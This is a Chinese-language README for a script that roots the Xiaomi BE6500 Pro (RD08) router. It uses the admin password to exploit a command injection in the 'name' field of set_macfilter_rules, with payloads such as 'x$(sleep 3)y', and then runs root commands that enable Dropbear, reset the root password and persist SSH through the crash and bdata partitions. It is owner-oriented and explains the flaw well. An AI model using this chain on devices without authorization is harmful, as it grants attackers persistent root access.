# 小米 BE6500 Pro（RD08）开启 SSH

本文针对 RD08 固件 **1.1.96**，以 [Python 脚本](./rd08_ssh_enable.py) 的实现为准。流程需要路由器 Web 管理密码：先登录取得 `stok`，再通过 `set_macfilter_rules` 的 `name` 参数执行 root 命令，启动固件自带的 Dropbear SSH 服务。

## 技术原理

### 1. 登录认证：取得 stok

脚本先请求两个接口：

```text
GET /cgi-bin/luci/web
GET /cgi-bin/luci/api/xqsystem/init_info
```

从 Web 页面提取 `deviceId` 和 `key`，从 `init_info` 读取设备信息及 `newEncryptMode`。`newEncryptMode` 为 `1` 时使用 SHA-256，否则使用 SHA-1。

登录参数按以下方式计算，其中 `H` 表示对 UTF-8 字节求哈希并输出小写十六进制字符串，`+` 表示字符串拼接：

```text
nonce = "0_" + deviceId + "_" + Unix时间戳（秒） + "_" + 随机整数
password = H(nonce + H(Web管理密码 + key))
```

随后向 `/cgi-bin/luci/api/xqsystem/login` 提交表单：

```text
username = admin
password = 上述计算结果
logtype  = 2
nonce    = 上述 nonce
```

响应中的 `token` 就是后续请求使用的 `stok`。因此，这条利用链需要先通过管理员认证。

### 2. 命令注入：name 为什么能执行 Shell 命令

漏洞入口是复数形式的接口：

```text
POST /cgi-bin/luci/;stok=<stok>/api/xqsystem/set_macfilter_rules
```

固件中的关键数据流如下：

1. `XQSecureUtil.hackCheck` 会过滤普通参数中的反引号、`;`、`|`、`$`、`&` 和换行，但 `name` 属于跳过过滤的白名单。
2. `set_macfilter_rules` 对 `mac` 做格式校验，却直接读取 `formvalue("name")`，未做同等的内容校验。
3. 接口按分号拆分名称，与 MAC 配对后传给 `XQFirewall.setMacFilter`。
4. `setMacFilter` 将名称直接拼入命令，既没有引号或转义，也没有经过命令级过滤 `cmdSafeCheck`。

关键逻辑可简化为：

```lua
cmd = "/usr/sbin/macfilter " .. action .. " " .. mode .. " " .. mac
if name then
    cmd = cmd .. " rulename=" .. name
end
os.execute(cmd)
```

脚本将 `name` 设置为 `x$(命令)y`。Shell 解析 `rulename=x$(命令)y` 时，会先执行 `$()` 中的命令，再把其标准输出代入参数。该调用以 root 权限执行，因此可以修改系统配置并启动 SSH。

这里的关键是：**白名单放过输入，接口缺少校验，最终又将输入直接交给 Shell。** 其他调用点即使使用了 `cmdSafeCheck` 或转义函数，也无法保护这条未调用它们的路径。

构造请求时有两个限制：

- 命令不能含 `;`，因为接口会先按分号拆分名称；需要串联命令时，脚本使用 `&&`。
- 添加规则需要使用尚未存在的合法 MAC；已有规则可能进入更新分支，无法触发上述执行路径。脚本为三次注入生成不同的 MAC，但未预先查询它们是否已被占用。

例如，将以下字段作为 URL 编码表单提交，会尝试执行 `sleep 3`：

```text
mac    = 0A:11:22:33:44:51
name   = x$(sleep 3)y
option = add
wan    = 空字符串
```

响应延迟可用于辅助判断命令是否执行。注入会新增 MAC 过滤规则，脚本在结束或失败时都会尝试用 `option=del` 清理已尝试添加的规则。

### 3. 开启 SSH：配置开关、启动服务、设置密码

菜单 `1` 通过三次注入依次完成以下操作。

首先保存 SSH 和 Telnet 开关，Telnet 供后续固化过程中 SSH 不可用时尝试重连：

```sh
nvram set ssh_en=1 && nvram set telnet_en=1 && nvram commit
```

然后将 Dropbear 启动脚本中的 `channel` 改为 `debug`，绕过原有通道限制并启动服务：

```sh
sed -i "s/channel=.*/channel=\"debug\"/g" /etc/init.d/dropbear && /etc/init.d/dropbear start
```

最后设置用户输入的 root 密码。脚本在本地将“密码、换行、密码、换行”编码为 Base64，再在路由器端解码并交给 `passwd root`：

```sh
printf '%s' '<密码数据的Base64编码>' | base64 -d | passwd root
```

这样传递密码是为了避免密码中的字符被 Shell 当作命令解释；Base64 本身不提供加密。

完成后，脚本使用该密码实际登录 SSH，并检查 `id -u` 是否返回 `0`。API 返回成功或端口 22 可连接，都不能单独证明 root 登录成功。

“临时开启”指 Dropbear 启动脚本的修改通常会在重启后失效；已经提交的 `ssh_en`、`telnet_en` 和密码修改不能视为自动撤销。

### 4. 固化：重启后重新开启 SSH

| 方式 | 实现机制 | 脚本完成时的检查 |
| --- | --- | --- |
| 软固化（菜单 `2`） | 在 `/data/auto_ssh/auto_ssh.sh` 保存脚本，通过 UCI 的 `firewall` include 配置在启动时执行，重新修改 `channel` 并重启 Dropbear | 脚本内容哈希、执行权限、Shell 语法及 UCI 配置；开机效果需另行重启验证 |
| 深度固化（菜单 `3`） | 通过 `crash` 调试引导流程将开关写入 `bdata`，经历三次重启，最后恢复 Dropbear 并安装软固化脚本 | 每次重启的下线状态、`boot_id` 变化、root 重连、关键配置值，以及最终 SSH 登录 |

软固化脚本内容为：

```sh
#!/bin/sh
sleep 5
sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear || exit 1
/etc/init.d/dropbear restart
```

深度固化按以下顺序执行：

1. 向 `crash` 分区写入调试标记，进行第一次重启，进入调试引导流程。
2. 向 `nvram` 和 `bdata` 写入 `ssh_en=1`、`telnet_en=1`、`uart_en=1`、`boot_wait=on`，提交并读回校验，然后进行第二次重启。
3. 再次检查 `bdata`，擦除 `crash` 分区以恢复正常引导，进行第三次重启。
4. 检查 `bdata`，恢复 Dropbear，重新安装自启脚本，并验证 SSH root 登录。

`bdata` 保存引导相关配置，深度固化旨在让开关比普通运行配置更持久；脚本中的三次重启检查不能证明升级固件或恢复出厂后的行为。

## 操作步骤

### 1. 准备并运行

将电脑连接到路由器所在局域网，确认能打开管理页面，并在后台核对型号为 RD08、固件为 1.1.96。脚本会显示设备信息，但不会强制阻止其他型号或版本运行。

安装 Python 3，在本项目目录的终端中执行：

```sh
python -m pip install requests ssh2-python
python rd08_ssh_enable.py
```

按提示依次输入：

1. **路由器 IP**：默认 `192.168.31.1`，修改过 LAN 地址时填写实际地址。
2. **Web 管理密码**：用于取得 `stok`。
3. **SSH root 密码**：执行菜单 `1` 时将设置此密码；若 SSH 已开启、仅执行固化，则填写当前 root 密码。

密码不能为空，也不能包含换行、NUL 等控制字符；首尾空格会保留。支持隐藏输入的终端不会显示字符或星号，输入后按回车。IDLE 等无法隐藏输入的环境会提示改用可见输入。

### 2. 开启并验证 SSH

选择菜单 `1`，确认后等待三步操作完成。出现“SSH root 登录已验证”后，在另一个终端连接：

```sh
ssh root@192.168.31.1
```

输入刚才设置的 root 密码，登录后执行：

```sh
id -u
```

返回 `0` 表示当前为 root。路由器地址不是默认值时，相应替换 SSH 命令中的地址。

若脚本提示注入被拒绝、登录失败或 MAC 规则清理失败，先检查对应错误和后台规则状态；菜单显示“端口可连接”只代表 TCP 连接成功。

### 3. 按需安装软固化

在 SSH 已开启、root 密码有效的情况下选择菜单 `2`，确认安装。脚本会写入自启文件和 UCI 配置，并检查安装结果。

看到“自启脚本及配置已安装并校验”后，从管理后台手动重启路由器。等待恢复联网，再执行上一步的 SSH 登录和 `id -u`，确认开机自启实际生效。

需要移除自启项时，在路由器的 SSH 会话中执行：

```sh
uci delete firewall.auto_ssh && uci commit firewall
```

该操作仅取消自启配置，不会还原 root 密码、NVRAM 开关或立即关闭当前 SSH 服务。

### 4. 按需执行深度固化

深度固化会写入和擦除分区。先完成全分区备份并保存到电脑，再在已有 root 连接可用的情况下选择菜单 `3`。

确认备份及开始提示后，保持设备供电，等待脚本按上述顺序完成三次重启。每次重启后，脚本优先尝试 SSH，失败时尝试 Telnet，并验证 root 身份和新的 `boot_id`。

出现“三次重启、bdata 配置及 SSH 登录已验证”后，再手动登录 SSH 检查。若中途失败，按脚本显示的中断阶段检查设备及分区状态，不要直接从第一步重跑。

### 5. .NET 版本入口

仓库另有 [.NET 实现](./Rd08SshTool)，目标框架为 .NET 8，依赖 SSH.NET。安装 .NET 8 SDK 后，可在项目根目录运行：

```sh
dotnet run --project Rd08SshTool
```

该版本保留相同的三项菜单，但尚未同步 Python 版的密码编码、实际 SSH 登录验证和固化校验逻辑；上文的具体行为及成功判定以 Python 版为准。
